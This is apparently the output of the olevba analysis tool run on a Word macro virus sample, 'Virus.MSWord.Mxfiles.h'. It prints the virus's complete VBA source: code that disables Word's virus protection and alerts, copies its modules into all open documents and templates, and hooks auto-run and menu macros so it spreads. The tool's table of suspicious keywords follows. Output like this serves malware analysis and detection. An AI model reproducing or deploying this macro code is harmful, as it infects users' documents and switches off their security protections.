olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Mxfiles.h
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Mxfiles.h - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO girls.bas 
in file: ./Virus.MSWord.Mxfiles.h - OLE stream: 'Macros/VBA/girls'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub girls()
 On Error Resume Next
 Application.ScreenUpdating = False
 Application.DisplayAlerts = wdAlertsNone
 WordBasic.DisableAutoMacros 0
 Options.VirusProtection = False
 Options.SaveNormalPrompt = False
 Options.ConfirmConversions = False
 TDFname = ThisDocument.FullName
 For j = 1 To Documents.Count
    If Documents.Item(j).Path <> "" Then
        destin = Documents.Item(j).FullName
        SetAttr destin, vbNormal
    Else
        destin = Documents.Item(j).Name
    End If
 If StrComp(TDFname, destin, 1) <> 0 Then
   With Application
    .OrganizerCopy Source:=TDFname, Destination:=destin, Name:="girls", Object:=wdOrganizerObjectProjectItems
    .OrganizerCopy Source:=TDFname, Destination:=destin, Name:="SFrm", Object:=wdOrganizerObjectProjectItems
    End With
    If Documents.Item(j).Path <> "" Then
        Documents.Item(j).Save
    End If
 End If
 ddt = Documents.Item(j).AttachedTemplate
 ddt1 = Options.DefaultFilePath(Path:=wdUserTemplatesPath)
 ddt2 = ddt1 + "\" + ddt
 SetAttr ddt2, vbNormal
 If StrComp(TDFname, ddt2, 1) <> 0 Then
    With Application
    .OrganizerCopy Source:=TDFname, Destination:=ddt2, Name:="girls", Object:=wdOrganizerObjectProjectItems
    .OrganizerCopy Source:=TDFname, Destination:=ddt2, Name:="SFrm", Object:=wdOrganizerObjectProjectItems
    End With
 End If
 Next j
 Application.ScreenUpdating = True
 Effect
End Sub
Sub Effect()
  On Error Resume Next
 If Day(Date) = Month(Date) Then
  Assistant.Visible = True
  Assistant.Animation = msoAnimationGetArtsy
  SFrm.Show
 End If
End Sub
Sub toolsmacro()
 girls
End Sub
Sub ViewVBCode()
  girls
End Sub
Sub ToolsCustomize()
 girls
End Sub
Sub FileTemplates()
  girls
End Sub
Sub AutoOpen()
 girls
End Sub
Sub autoclose()
 girls
End Sub
Sub Autonew()
 girls
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|AutoExec  |Autonew             |Runs when a new Word document is created     |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

